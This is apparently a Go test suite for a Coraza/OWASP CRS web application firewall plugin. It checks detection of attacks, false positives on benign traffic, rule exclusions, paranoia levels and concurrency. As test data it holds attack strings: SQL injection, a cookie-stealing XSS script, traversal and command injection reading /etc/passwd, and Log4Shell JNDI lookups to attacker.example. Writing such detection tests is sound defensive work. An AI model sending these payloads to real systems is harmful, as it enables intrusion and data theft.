package coraza

import (
	"context"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"zoraxy-waf-plugin/internal/engine"
)

var shared *Engine

func TestMain(m *testing.M) {
	var err error
	shared, err = New([]int{1, 2}, 5)
	if err != nil {
		panic(err)
	}
	code := m.Run()
	shared.Close()
	os.Exit(code)
}

func browserHeaders() map[string][]string {
	return map[string][]string{
		"User-Agent":      {"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"},
		"Accept":          {"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
		"Accept-Language": {"en-US,en;q=0.5"},
		"Accept-Encoding": {"gzip, deflate"},
	}
}

func get(uri string) *engine.Request {
	return &engine.Request{ID: "t", Method: "GET", RawURI: uri, Proto: "HTTP/1.1", Host: "shop.example", ClientIP: "203.0.113.7", Header: browserHeaders()}
}

func post(uri, ctype, body string) *engine.Request {
	r := get(uri)
	r.Method = "POST"
	r.Header["Content-Type"] = []string{ctype}
	r.Header["Content-Length"] = []string{strconv.Itoa(len(body))}
	r.Body = []byte(body)
	return r
}

func inspect(t *testing.T, r *engine.Request, opts engine.Options) engine.Decision {
	t.Helper()
	if opts.ParanoiaLevel == 0 {
		opts.ParanoiaLevel = 1
	}
	d, err := shared.Inspect(context.Background(), r, opts)
	if err != nil {
		t.Fatalf("inspect %s %s: %v", r.Method, r.RawURI, err)
	}
	return d
}

func ruleIDs(d engine.Decision) []int {
	var ids []int
	for _, m := range d.Matches {
		ids = append(ids, m.RuleID)
	}
	return ids
}

func hasRuleInRange(d engine.Decision, lo, hi int) bool {
	for _, m := range d.Matches {
		if m.RuleID >= lo && m.RuleID <= hi {
			return true
		}
	}
	return false
}

func q(s string) string { return url.QueryEscape(s) }

type attack struct {
	name   string
	param  string
	value  string
	lo, hi int // expected CRS rule family
}

var attacks = []attack{
	{"sqli-or", "id", "1' OR 1=1-- -", 942000, 942999},
	{"sqli-union", "id", "1 UNION SELECT username,password FROM users", 942000, 942999},
	{"xss-script", "q", "<script>alert(document.cookie)</script>", 941000, 941999},
	{"path-traversal", "file", "../../../../etc/passwd", 930000, 930999},
	{"command-injection", "host", "127.0.0.1; cat /etc/passwd", 932000, 932999},
	{"log4shell", "q", "${jndi:ldap://attacker.example/a}", 944000, 944999},
}

func TestCRSDetectsAttacksInQuery(t *testing.T) {
	for _, a := range attacks {
		d := inspect(t, get("/search?"+a.param+"="+q(a.value)), engine.Options{})
		if !d.Interrupted || d.Status != 403 {
			t.Errorf("%s: GET not interrupted (status %d) rules=%v", a.name, d.Status, ruleIDs(d))
		}
		if !hasRuleInRange(d, a.lo, a.hi) {
			t.Errorf("%s: expected rule %d-%d, got %v", a.name, a.lo, a.hi, ruleIDs(d))
		}
		if !hasRuleInRange(d, 949110, 949110) {
			t.Errorf("%s: blocking evaluation 949110 missing: %v", a.name, ruleIDs(d))
		}
	}
}

func TestCRSDetectsAttacksInFormAndJSONBodies(t *testing.T) {
	for _, a := range attacks {
		d := inspect(t, post("/submit", "application/x-www-form-urlencoded", a.param+"="+q(a.value)), engine.Options{})
		if !d.Interrupted || !hasRuleInRange(d, a.lo, a.hi) {
			t.Errorf("%s: form POST not detected: interrupted=%v rules=%v", a.name, d.Interrupted, ruleIDs(d))
		}
		body := `{"` + a.param + `":` + jsonString(a.value) + `}`
		d = inspect(t, post("/api", "application/json", body), engine.Options{})
		if !d.Interrupted || !hasRuleInRange(d, a.lo, a.hi) {
			t.Errorf("%s: JSON POST not detected: interrupted=%v rules=%v", a.name, d.Interrupted, ruleIDs(d))
		}
	}
}

func TestLog4ShellInHeader(t *testing.T) {
	r := get("/")
	r.Header["User-Agent"] = []string{"${jndi:ldap://attacker.example/x}"}
	d := inspect(t, r, engine.Options{})
	if !d.Interrupted || !hasRuleInRange(d, 944000, 944999) {
		t.Fatalf("header Log4Shell not detected: %v", ruleIDs(d))
	}
}

func jsonString(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `"`, `\"`)
	return `"` + r.Replace(s) + `"`
}

func TestBenignRequestsAtPL1(t *testing.T) {
	cases := []*engine.Request{
		get("/"),
		get("/products?category=garden&page=2&sort=price_asc"),
		get("/search?q=" + q("blue running shoes size 42")),
		post("/login", "application/x-www-form-urlencoded", "username=alice&password="+q("correct horse battery staple")+"&remember=on"),
		post("/api/orders", "application/json", `{"items":[{"sku":"A-100","qty":2}],"note":"Leave at the door, thanks!"}`),
		post("/comment", "application/x-www-form-urlencoded", "text="+q("I'd like to order again. Great service & fast delivery.")),
	}
	for _, r := range cases {
		d := inspect(t, r, engine.Options{})
		if d.Interrupted {
			t.Errorf("benign %s %s interrupted: %v", r.Method, r.RawURI, d.Matches)
		}
	}
}

func TestExclusionsAppliedPerTransactionBeforeEvaluation(t *testing.T) {
	r := get("/search?q=" + q("1' OR 1=1-- -"))
	base := inspect(t, r, engine.Options{})
	if !base.Interrupted {
		t.Fatal("precondition: attack must be interrupted")
	}
	var excl []engine.Exclusion
	var unrelated []engine.Exclusion
	for _, m := range base.Matches {
		if m.RuleID >= 942000 && m.RuleID <= 942999 {
			excl = append(excl, engine.Exclusion{RuleID: m.RuleID, Argument: "q"})
			unrelated = append(unrelated, engine.Exclusion{RuleID: m.RuleID, Argument: "other"})
		}
	}
	if d := inspect(t, r, engine.Options{Exclusions: unrelated}); !d.Interrupted {
		t.Fatal("exclusion for another argument must not suppress detection")
	}
	d := inspect(t, r, engine.Options{Exclusions: excl})
	if d.Interrupted || hasRuleInRange(d, 942000, 942999) {
		t.Fatalf("argument exclusions not applied: %v", ruleIDs(d))
	}
	// Whole-rule exclusion through the transaction API.
	var whole []engine.Exclusion
	for _, e := range excl {
		whole = append(whole, engine.Exclusion{RuleID: e.RuleID})
	}
	if d := inspect(t, r, engine.Options{Exclusions: whole}); d.Interrupted {
		t.Fatalf("whole-rule exclusions not applied: %v", ruleIDs(d))
	}
	// Exclusions must not leak into later transactions.
	if d := inspect(t, r, engine.Options{}); !d.Interrupted {
		t.Fatal("exclusion leaked into a later transaction")
	}
}

func TestParanoiaLevelSelection(t *testing.T) {
	r := get("/")
	delete(r.Header, "User-Agent") // 920320 "Missing User Agent Header" is paranoia-level/2 in CRS 4.25
	d1 := inspect(t, r, engine.Options{ParanoiaLevel: 1})
	d2 := inspect(t, r, engine.Options{ParanoiaLevel: 2})
	if hasRuleInRange(d1, 920320, 920320) {
		t.Fatal("PL2 rule fired at PL1")
	}
	if !hasRuleInRange(d2, 920320, 920320) {
		t.Fatalf("PL2 rule missing at PL2: %v", ruleIDs(d2))
	}
	if _, err := shared.Inspect(context.Background(), r, engine.Options{ParanoiaLevel: 3}); err == nil {
		t.Fatal("uncompiled paranoia level accepted")
	}
}

func TestTruncatedJSONIsNotAParseErrorBlock(t *testing.T) {
	r := post("/api", "application/json", `{"items":[{"sku":"A-100","qty":2},{"sku":"B-2`)
	r.BodyTruncated = true
	d := inspect(t, r, engine.Options{})
	if d.Interrupted {
		t.Fatalf("truncated benign JSON prefix interrupted: %v", d.Matches)
	}
	r.BodyTruncated = false
	if d := inspect(t, r, engine.Options{}); !d.Interrupted || !hasRuleInRange(d, 200002, 200002) {
		t.Fatalf("complete malformed JSON should hit 200002: %v", ruleIDs(d))
	}
}

func TestMatchesCarryNoMatchedValues(t *testing.T) {
	secret := "Sup3rS3cretValue' OR 1=1-- -"
	d := inspect(t, post("/login", "application/x-www-form-urlencoded", "password="+q(secret)), engine.Options{})
	if !d.Interrupted {
		t.Fatal("precondition")
	}
	for _, m := range d.Matches {
		joined := m.Message + strings.Join(m.Targets, ",") + strings.Join(m.Tags, ",")
		if strings.Contains(joined, "Sup3rS3cret") {
			t.Fatalf("match leaks request value: %+v", m)
		}
	}
	found := false
	for _, m := range d.Matches {
		for _, tg := range m.Targets {
			if strings.HasSuffix(tg, ":password") {
				found = true
			}
		}
	}
	if !found {
		t.Fatalf("argument name not reported in targets: %+v", d.Matches)
	}
}

func TestNologBookkeepingRulesAreNotReported(t *testing.T) {
	d := inspect(t, post("/api", "application/json", `{"a":1}`), engine.Options{})
	for _, m := range d.Matches {
		if m.RuleID >= 900000 && m.RuleID < 902000 {
			t.Fatalf("nolog initialization rule reported: %+v", m)
		}
	}
}

func TestContextCheckedAtEntry(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := shared.Inspect(ctx, get("/"), engine.Options{ParanoiaLevel: 1}); err == nil {
		t.Fatal("cancelled context not honoured")
	}
	ctx, cancel = context.WithDeadline(context.Background(), time.Now().Add(-time.Second))
	defer cancel()
	if _, err := shared.Inspect(ctx, get("/"), engine.Options{ParanoiaLevel: 1}); err == nil {
		t.Fatal("expired deadline not honoured")
	}
}

func TestConcurrentInspections(t *testing.T) {
	var wg sync.WaitGroup
	errs := make(chan string, 64)
	for i := 0; i < 32; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			r := get("/search?id=" + q("1 UNION SELECT a FROM b"))
			if i%2 == 0 {
				r = get("/products?page=2")
			}
			d, err := shared.Inspect(context.Background(), r, engine.Options{ParanoiaLevel: 1})
			if err != nil || d.Interrupted != (i%2 == 1) {
				errs <- r.RawURI
			}
		}(i)
	}
	wg.Wait()
	close(errs)
	for e := range errs {
		t.Errorf("wrong concurrent verdict for %s", e)
	}
}

func TestCapabilitiesAndHealth(t *testing.T) {
	c := shared.Capabilities()
	if c.Name != "coraza" || !c.RuleExclusions || !c.ParanoiaLevels || !c.RuleDetails || c.Challenge || c.ResponsePhases {
		t.Fatalf("capabilities %+v", c)
	}
	h := shared.Health()
	if !h.OK || !strings.Contains(h.RuleSet, "4.25.0") || h.Rules < 100 {
		t.Fatalf("health %+v", h)
	}
	if !NoDiskSpool {
		t.Fatal("built without no_fs_access: Coraza may spool request bodies to disk")
	}
}

func TestNewRejectsInvalidParanoiaLevel(t *testing.T) {
	if _, err := New([]int{0}, 5); err == nil {
		t.Fatal("PL0 accepted")
	}
	if _, err := New([]int{5}, 5); err == nil {
		t.Fatal("PL5 accepted")
	}
}
